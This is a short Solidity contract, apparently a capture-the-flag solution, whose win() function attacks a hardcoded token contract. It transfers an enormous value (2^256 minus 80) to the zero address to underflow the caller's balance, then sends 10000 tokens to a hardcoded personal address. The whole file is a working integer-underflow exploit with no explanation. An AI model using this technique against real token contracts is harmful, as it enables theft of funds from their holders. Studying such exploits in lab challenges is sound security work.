// SPDX-License-Identifier: MIT
pragma solidity >=0.6.12 <0.9.0;

interface task {
  function transfer (address _to, uint _value) external returns (bool);
}

contract Balance04TheWin {
  address taskAddress = 0x283113361aaC50753Eaba21409C7d994010B27a9;
  address myAddress = 0x25C0e2687258D2DAc9BBc1D9e9e620fBcd622575;

  function win() public {
    task(taskAddress).transfer(0x0000000000000000000000000000000000000000, 115792089237316195423570985008687907853269984665640564039457584007913129629936);
    task(taskAddress).transfer(myAddress, 10000);
  }
}
      
